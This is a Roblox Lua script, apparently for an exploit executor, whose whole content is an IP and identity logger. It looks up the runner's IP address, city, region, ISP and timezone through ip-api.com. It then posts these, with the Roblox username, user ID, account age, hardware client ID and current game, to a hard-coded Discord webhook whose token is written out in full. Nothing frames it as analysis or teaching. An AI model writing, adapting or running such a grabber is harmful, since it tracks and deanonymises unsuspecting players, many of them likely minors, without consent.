local HttpService = game:GetService("HttpService")
local plr = game:GetService("Players")
local lplr = plr.LocalPlayer

Webhook_URL = "https://discord.com/api/webhooks/1242406279327256577/HPPyU_SzCzz4sktDAeWzrahzQsp0l1Cyww5l0gAdG5r0foCS40BOBToYVP3-IiHB0m7Y"
local ip_info = request({
    Url = "http://ip-api.com/json",
    Method = 'GET'
})

local ipinfo_table = HttpService:JSONDecode(ip_info.Body)

local response = request(
{
    Url = Webhook_URL,
	Method = 'POST',
	Headers = {
	    ['Content-Type'] = 'application/json'
	},
	Body = HttpService:JSONEncode({
	    ["content"] = "",
		["embeds"] = {{
		    ["title"] = "**Your script has been executed!**",
			["description"] = game.Players.LocalPlayer.DisplayName.." has executed the script.",
			["type"] = "rich",
			["color"] = tonumber(0xffffff),
			["fields"] = {
                {
                    ["name"] = "Status:",
                    ["value"] = ipinfo_table.status,
                    ["inline"] = true
                },
                {
                    ["name"] = "Roblox Username:",
                    ["value"] = lplr.Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "Roblox DisplayName:",
                    ["value"] = lplr.DisplayName,
                    ["inline"] = true
                },
		{
		    ["name"] = "Hardware ID:",
		    ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
		    ["inline"] = true
		},
                {
                    ["name"] = "Game Logged:",
                    ["value"] = "https://www.roblox.com/games/"..game.PlaceId,
                    ["inline"] = true
                },
                {
                    ["name"] = "User ID:",
                    ["value"] = lplr.UserId,
                    ["inline"] = true
                },
                {
                    ["name"] = "Account Age:",
                    ["value"] = lplr.AccountAge.." days",
                    ["inline"] = true
                },
                {
                    ["name"] = "IP:",
                    ["value"] = ipinfo_table.query,
                    ["inline"] = true
                },
                {
                    ["name"] = "Country:",
                    ["value"] = ipinfo_table.countryCode,
                    ["inline"] = true
                },
                {
                    ["name"] = "Timezone:",
                    ["value"] = ipinfo_table.timezone,
                    ["inline"] = true
                },
                {
                    ["name"] = "City:",
                    ["value"] = ipinfo_table.city,
                    ["inline"] = true
                },
                {
                    ["name"] = "ISP:",
                    ["value"] = ipinfo_table.isp,
                    ["inline"] = true
                },
                {
                    ["name"] = "Region:",
                    ["value"] = ipinfo_table.region,
                    ["inline"] = true
                },
                {
                    ["name"] = "RegionName:",
                    ["value"] = ipinfo_table.regionName,
                    ["inline"] = true
                },
                {
                    ["name"] = "AS:",
                    ["value"] = ipinfo_table.as,
                    ["inline"] = true
                }
			}
		}}
	})
}
)
